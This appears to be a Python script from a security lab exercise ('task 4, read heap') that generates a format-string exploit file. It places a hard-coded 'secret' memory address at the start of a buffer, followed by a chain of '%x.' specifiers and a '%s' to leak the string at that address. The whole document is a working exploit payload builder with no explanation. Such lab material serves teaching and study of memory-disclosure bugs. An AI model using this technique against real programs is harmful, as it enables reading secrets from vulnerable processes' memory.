#!/usr/bin/python3
import sys

N = 1500
content = bytearray(0x0 for i in range(N))

secret_address = 0x080b4008
content[0:4] = (secret_address).to_bytes(4, byteorder='little')

s = "%x." * 31 + "%s"

fmt = (s).encode('latin-1')
content[4:4 + len(fmt)] = fmt

file = open("task_4_read_heap_badfile", "wb")
file.write(content)
file.close()
